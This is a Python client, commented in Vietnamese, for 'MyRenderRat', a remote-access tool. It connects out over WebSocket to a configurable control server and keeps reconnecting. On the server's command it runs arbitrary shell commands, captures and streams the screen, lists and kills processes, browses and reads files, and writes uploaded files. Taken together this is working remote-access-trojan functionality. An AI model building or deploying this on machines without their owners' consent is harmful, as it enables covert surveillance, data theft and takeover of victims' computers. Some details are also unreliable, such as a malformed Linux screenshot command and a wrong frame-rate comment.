"""
MyRenderRat - Client
Phần mềm client để chạy trên máy tính cần kiểm soát
Kết nối với server qua WebSocket
"""

import asyncio
import websockets
import json
import uuid
import platform
import psutil
import subprocess
import base64
import os
from datetime import datetime
import sys
import threading
import time

# ===============================
# CẤU HÌNH
# ===============================

SERVER_URL = "ws://localhost:8000"  # Thay đổi theo IP/domain của server
CLIENT_ID = str(uuid.uuid4())[:12]  # ID duy nhất cho client
RECONNECT_INTERVAL = 5  # Giây - Khoảng thời gian reconnect
MAX_RETRIES = 999  # Số lần thử lại vô hạn

print(f"[CLIENT] ID: {CLIENT_ID}")
print(f"[CLIENT] Server: {SERVER_URL}")

# ===============================
# BIẾN TOÀN CỤC
# ===============================

websocket = None
stream_active = False
screen_thread = None

# ===============================
# HỆ THỐNG & THÔNG TIN
# ===============================

def get_system_info():
    """Lấy thông tin hệ thống"""
    try:
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.release(),
            "processor": platform.processor(),
            "cpu_count": psutil.cpu_count(),
            "memory": {
                "total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                "available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
                "percent": psutil.virtual_memory().percent
            },
            "disk": {
                "total_gb": round(psutil.disk_usage('/').total / (1024**3), 2),
                "used_gb": round(psutil.disk_usage('/').used / (1024**3), 2),
                "percent": psutil.disk_usage('/').percent
            }
        }
    except Exception as e:
        return {"error": str(e)}

def get_processes():
    """Lấy danh sách tiến trình đang chạy"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'status', 'memory_percent']):
            try:
                processes.append({
                    "pid": proc.info['pid'],
                    "name": proc.info['name'],
                    "status": proc.info['status'],
                    "memory_mb": round(proc.info['memory_percent'] or 0, 2)
                })
            except:
                pass
        return sorted(processes, key=lambda x: x['memory_mb'], reverse=True)[:100]
    except Exception as e:
        return {"error": str(e)}

# ===============================
# SCREENSHOT
# ===============================

def get_screenshot():
    """Chụp màn hình và trả về base64"""
    try:
        if platform.system() == "Windows":
            from PIL import ImageGrab, Image
            img = ImageGrab.grab()
            img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
            
            import io
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=85)
            buf.seek(0)
            return base64.b64encode(buf.getvalue()).decode()
        else:
            import subprocess
            # Linux: dùng gnome-screenshot hoặc import-imagemagick
            result = subprocess.run(['import', '-', '/tmp/screenshot.jpg'], 
                                  capture_output=True)
            if result.returncode == 0:
                with open('/tmp/screenshot.jpg', 'rb') as f:
                    return base64.b64encode(f.read()).decode()
    except:
        pass
    return None

def start_screen_streaming():
    """Bắt đầu stream màn hình liên tục"""
    global stream_active, websocket
    
    try:
        from PIL import ImageGrab, Image
    except:
        print("[CLIENT] PIL không được cài đặt. Cài đặt: pip install pillow")
        return

    while stream_active and websocket:
        try:
            img = ImageGrab.grab()
            img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
            
            import io
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=75)
            buf.seek(0)
            
            data = base64.b64encode(buf.getvalue()).decode()
            
            # Gửi frame
            asyncio.run_coroutine_threadsafe(
                websocket.send(json.dumps({
                    "type": "stream_frame",
                    "data": data
                })),
                asyncio.get_event_loop()
            )
            
            time.sleep(0.5)  # ~20 FPS
        except Exception as e:
            print(f"[STREAM] Lỗi: {e}")
            break

# ===============================
# LỆNH HỆ THỐNG
# ===============================

def execute_command(cmd):
    """Thực thi lệnh shell"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return {
            "stdout": result.stdout[:5000],  # Giới hạn 5KB
            "stderr": result.stderr[:5000],
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"error": "Command timeout"}
    except Exception as e:
        return {"error": str(e)}

def kill_process(pid):
    """Kết thúc một tiến trình"""
    try:
        p = psutil.Process(pid)
        p.terminate()
        p.wait(timeout=5)
        return {"success": True, "message": f"Process {pid} terminated"}
    except Exception as e:
        return {"error": str(e)}

# ===============================
# QUẢN LÝ TẬP TIN
# ===============================

def list_directory(path="."):
    """Liệt kê tập tin trong thư mục"""
    try:
        if not os.path.exists(path):
            return {"error": "Path not found"}
        
        items = []
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            try:
                is_dir = os.path.isdir(full_path)
                size = os.path.getsize(full_path) if not is_dir else 0
                items.append({
                    "name": item,
                    "is_dir": is_dir,
                    "size": size,
                    "modified": os.path.getmtime(full_path)
                })
            except:
                pass
        
        return {
            "path": os.path.abspath(path),
            "items": sorted(items, key=lambda x: (not x['is_dir'], x['name']))
        }
    except Exception as e:
        return {"error": str(e)}

def read_file(path):
    """Đọc tập tin"""
    try:
        if not os.path.exists(path):
            return {"error": "File not found"}
        
        if os.path.getsize(path) > 10 * 1024 * 1024:  # >10MB
            return {"error": "File too large"}
        
        with open(path, 'r', errors='ignore') as f:
            content = f.read()
        
        return {
            "content": content[:50000],  # Giới hạn 50KB
            "size": len(content)
        }
    except Exception as e:
        return {"error": str(e)}

def upload_file(transfer_id, path, data):
    """Nhận file từ admin"""
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(data))
        return {"success": True, "path": path}
    except Exception as e:
        return {"error": str(e)}

# ===============================
# WEBSOCKET
# ===============================

async def connect_to_server():
    """Kết nối đến server"""
    global websocket
    
    retry_count = 0
    
    while retry_count < MAX_RETRIES:
        try:
            uri = f"{SERVER_URL}/ws/client/{CLIENT_ID}"
            print(f"[CLIENT] Đang kết nối tới {uri}...")
            
            websocket = await websockets.connect(uri)
            retry_count = 0
            print(f"[CLIENT] Đã kết nối thành công!")
            
            await handle_connection()
            
        except Exception as e:
            retry_count += 1
            print(f"[CLIENT] Lỗi kết nối: {e} (Thử lại {retry_count})")
            await asyncio.sleep(RECONNECT_INTERVAL)

async def handle_connection():
    """Xử lý tin nhắn từ server"""
    global websocket, stream_active, screen_thread
    
    try:
        async for message in websocket:
            try:
                data = json.loads(message)
                msg_type = data.get("type")
                
                print(f"[CLIENT] Nhận: {msg_type}")
                
                response = None
                
                # ── Screenshot ────────────────────────
                if msg_type == "request_screenshot":
                    quality = data.get("quality", 85)
                    screenshot_data = get_screenshot()
                    if screenshot_data:
                        response = {
                            "type": "screenshot",
                            "data": screenshot_data,
                            "quality": quality
                        }
                
                # ── Thông tin hệ thống ─────────────────
                elif msg_type == "request_sysinfo":
                    response = {
                        "type": "sysinfo",
                        "data": get_system_info()
                    }
                
                # ── Danh sách tiến trình ───────────────
                elif msg_type == "request_processes":
                    response = {
                        "type": "processes",
                        "data": get_processes()
                    }
                
                # ── Lệnh hệ thống ──────────────────────
                elif msg_type == "command":
                    cmd = data.get("command")
                    result = execute_command(cmd)
                    response = {
                        "type": "command_response",
                        "command": cmd,
                        "result": result
                    }
                
                # ── Kết thúc tiến trình ───────────────
                elif msg_type == "kill_process":
                    pid = data.get("pid")
                    result = kill_process(pid)
                    response = {
                        "type": "process_killed",
                        "pid": pid,
                        "result": result
                    }
                
                # ── Liệt kê thư mục ────────────────────
                elif msg_type == "list_directory":
                    path = data.get("path", ".")
                    result = list_directory(path)
                    response = {
                        "type": "file_list",
                        "data": result
                    }
                
                # ── Đọc tập tin ───────────────────────
                elif msg_type == "read_file":
                    path = data.get("path")
                    result = read_file(path)
                    response = {
                        "type": "file_content",
                        "path": path,
                        "data": result
                    }
                
                # ── Bắt đầu stream ────────────────────
                elif msg_type == "start_stream":
                    stream_active = True
                    screen_thread = threading.Thread(target=start_screen_streaming, daemon=True)
                    screen_thread.start()
                    response = {
                        "type": "stream_started",
                        "client_id": CLIENT_ID
                    }
                
                # ── Dừng stream ───────────────────────
                elif msg_type == "stop_stream":
                    stream_active = False
                    response = {
                        "type": "stream_stopped",
                        "client_id": CLIENT_ID
                    }
                
                # Gửi response nếu có
                if response:
                    await websocket.send(json.dumps(response))
            
            except json.JSONDecodeError:
                print("[CLIENT] Lỗi parse JSON")
            except Exception as e:
                print(f"[CLIENT] Lỗi xử lý: {e}")
    
    except websockets.exceptions.ConnectionClosed:
        print("[CLIENT] Kết nối đã đóng")
    except Exception as e:
        print(f"[CLIENT] Lỗi connection: {e}")

# ===============================
# MAIN
# ===============================

async def main():
    """Hàm chính"""
    print("=" * 60)
    print(f"  MyRenderRat Client v1.0")
    print("=" * 60)
    print(f"  Client ID: {CLIENT_ID}")
    print(f"  Server: {SERVER_URL}")
    print(f"  OS: {platform.system()} {platform.release()}")
    print("=" * 60)
    
    await connect_to_server()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[CLIENT] Đã dừng bởi người dùng")
        sys.exit(0)
